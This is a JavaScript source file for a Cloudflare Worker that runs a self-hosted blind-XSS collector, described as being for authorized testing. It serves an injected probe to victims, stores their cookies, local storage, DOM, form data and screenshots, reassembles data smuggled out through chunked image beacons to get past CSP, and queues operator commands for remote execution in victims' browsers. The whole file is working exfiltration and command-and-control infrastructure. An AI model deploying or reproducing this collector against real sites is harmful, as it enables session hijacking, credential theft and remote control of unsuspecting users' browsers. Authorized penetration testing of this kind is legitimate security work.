// blind-xss-collector — Cloudflare Worker (D1-backed).
// Self-hosted, interactive blind-XSS collector for AUTHORIZED security testing.
// Routes:
//   GET  /c/:token[.js]  serve the probe (public — victims load this)
//   POST /r/:token       full report via fetch/sendBeacon (public, CORS *)
//   GET  /p/:token       chunked image-beacon report (CSP img-src fallback)
//   GET  /q/:sid         probe polls pending commands (public, CORS *)
//   POST /qr/:id         probe returns a command result (public, CORS *)
//   GET  /               operator dashboard          (auth: ?key=AUTH_KEY)
//   GET  /api/*          dashboard data              (auth)
//   POST /api/cmd        queue an interactive command (auth)
import { PROBE } from './probe.js';
import { DASHBOARD } from './dashboard.js';

const CORS = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'GET,POST,OPTIONS', 'Access-Control-Allow-Headers': '*' };
const json = (o, init) => new Response(JSON.stringify(o), { ...(init || {}), headers: { 'Content-Type': 'application/json', ...CORS, ...((init && init.headers) || {}) } });
const GIF = Uint8Array.from(atob('R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='), c => c.charCodeAt(0));

async function readBody(req) { try { return JSON.parse(await req.text()); } catch (e) { return {}; } }
function ip(req) { return req.headers.get('CF-Connecting-IP') || req.headers.get('X-Forwarded-For') || ''; }
function ctEq(a, b) {                                          // constant-time key compare
  if (typeof a !== 'string' || typeof b !== 'string' || a.length !== b.length) return false;
  let r = 0; for (let i = 0; i < a.length; i++) r |= a.charCodeAt(i) ^ b.charCodeAt(i); return r === 0;
}

export default {
  async fetch(req, env) {
    const url = new URL(req.url);
    const path = url.pathname;
    const seg = path.split('/').filter(Boolean);
    if (req.method === 'OPTIONS') return new Response(null, { headers: CORS });
    const DB = env.DB;

    // ---- serve probe ----
    if (seg[0] === 'c' && seg[1]) {
      const token = seg[1].replace(/\.js$/, '');
      const body = PROBE.replace(/__TOKEN__/g, token).replace(/__BASE__/g, url.origin);
      return new Response(body, { headers: { 'Content-Type': 'application/javascript', 'Cache-Control': 'no-store', ...CORS } });
    }

    // ---- full report (fetch / sendBeacon) ----
    if (seg[0] === 'r' && seg[1] && req.method === 'POST') {
      const r = await readBody(req);
      await storeReport(DB, r, seg[1], ip(req), req.headers.get('User-Agent') || '');
      return json({ ok: true, sid: r.sid });
    }

    // ---- chunked image-beacon report (CSP fallback) ----
    if (seg[0] === 'p' && seg[1]) {
      const p = url.searchParams, sid = p.get('s'), field = p.get('f') || 'r';
      const idx = +p.get('i'), n = +p.get('n'), d = p.get('d') || '';
      const now = Date.now();
      await DB.prepare('DELETE FROM chunks WHERE ts < ?').bind(now - 600000).run();   // purge stale partial beacons (>10m)
      await DB.prepare('INSERT OR REPLACE INTO chunks(sid,field,idx,total,data,ts) VALUES(?,?,?,?,?,?)')
        .bind(sid, field, idx, n, d, now).run();
      const { results } = await DB.prepare('SELECT idx,data FROM chunks WHERE sid=? AND field=? ORDER BY idx').bind(sid, field).all();
      if (results.length === n) {
        let b64 = results.map(x => x.data).join('');
        try {
          const jsonStr = decodeURIComponent(escape(atob(decodeURIComponent(b64))));
          const obj = JSON.parse(jsonStr);
          if (field === 'r') await storeReport(DB, obj, seg[1], ip(req), req.headers.get('User-Agent') || '');
          else if (field[0] === 'q') await DB.prepare('UPDATE commands SET status=?,result=?,done=? WHERE id=?').bind('done', obj.result, now, obj.id).run();
        } catch (e) {}
        await DB.prepare('DELETE FROM chunks WHERE sid=? AND field=?').bind(sid, field).run();
      }
      return new Response(GIF, { headers: { 'Content-Type': 'image/gif', 'Cache-Control': 'no-store', ...CORS } });
    }

    // ---- probe polls for commands ----
    if (seg[0] === 'q' && seg[1] && req.method === 'GET') {
      const sid = seg[1];
      await DB.prepare('UPDATE sessions SET last_seen=? WHERE sid=?').bind(Date.now(), sid).run();
      const { results } = await DB.prepare("SELECT id,cmd FROM commands WHERE sid=? AND status='pending'").bind(sid).all();
      if (results.length) await DB.prepare("UPDATE commands SET status='sent' WHERE sid=? AND status='pending'").bind(sid).run();
      return json(results);
    }

    // ---- probe returns a command result ----
    if (seg[0] === 'qr' && seg[1] && req.method === 'POST') {
      const r = await readBody(req);
      await DB.prepare('UPDATE commands SET status=?,result=?,done=? WHERE id=?').bind('done', r.result, Date.now(), +seg[1]).run();
      return json({ ok: true });
    }

    // ================= dashboard (auth-gated) =================
    const key = url.searchParams.get('key') || '';
    const authed = !!(env.AUTH_KEY && key && ctEq(key, env.AUTH_KEY));

    if (path === '/' ) {
      if (!authed) return new Response('unauthorized — append ?key=YOUR_AUTH_KEY', { status: 401 });
      return new Response(DASHBOARD, { headers: { 'Content-Type': 'text/html' } });
    }
    if (seg[0] === 'api') {
      if (!authed) return json({ error: 'unauthorized' }, { status: 401 });
      if (seg[1] === 'sessions') {
        const { results } = await DB.prepare('SELECT * FROM sessions ORDER BY last_seen DESC LIMIT 500').all();
        return json(results);
      }
      if (seg[1] === 'reports') {
        const { results } = await DB.prepare('SELECT * FROM reports WHERE sid=? ORDER BY id DESC LIMIT 20').bind(url.searchParams.get('sid')).all();
        return json(results);
      }
      if (seg[1] === 'cmdresults') {
        const { results } = await DB.prepare('SELECT * FROM commands WHERE sid=? ORDER BY id DESC LIMIT 100').bind(url.searchParams.get('sid')).all();
        return json(results);
      }
      if (seg[1] === 'cmd' && req.method === 'POST') {
        const b = await readBody(req);
        await DB.prepare('INSERT INTO commands(sid,cmd,created) VALUES(?,?,?)').bind(b.sid, b.cmd, Date.now()).run();
        return json({ ok: true });
      }
    }
    return new Response('blind-xss-collector', { status: 404 });
  }
};

async function storeReport(DB, r, token, clientIp, hdrUa) {
  const now = Date.now();
  const S = v => (v == null ? null : (typeof v === 'string' ? v : JSON.stringify(v)));
  await DB.prepare(`INSERT INTO reports(sid,token,ts,url,referrer,title,origin,ip,ua,cookies,storage,dom,forms,meta,screenshot)
    VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).bind(
    r.sid || null, token, r.ts || now, r.url || '', r.referrer || '', r.title || '', r.origin || '',
    clientIp, r.ua || hdrUa, r.cookies || '', S(r.storage), r.dom || '', S(r.forms), S(r.meta), r.screenshot || null
  ).run();
  await DB.prepare(`INSERT INTO sessions(sid,token,first_seen,last_seen,url,ua,ip) VALUES(?,?,?,?,?,?,?)
    ON CONFLICT(sid) DO UPDATE SET last_seen=excluded.last_seen, url=excluded.url`).bind(
    r.sid || ('sid' + now), token, now, now, r.url || '', r.ua || hdrUa, clientIp
  ).run();
}
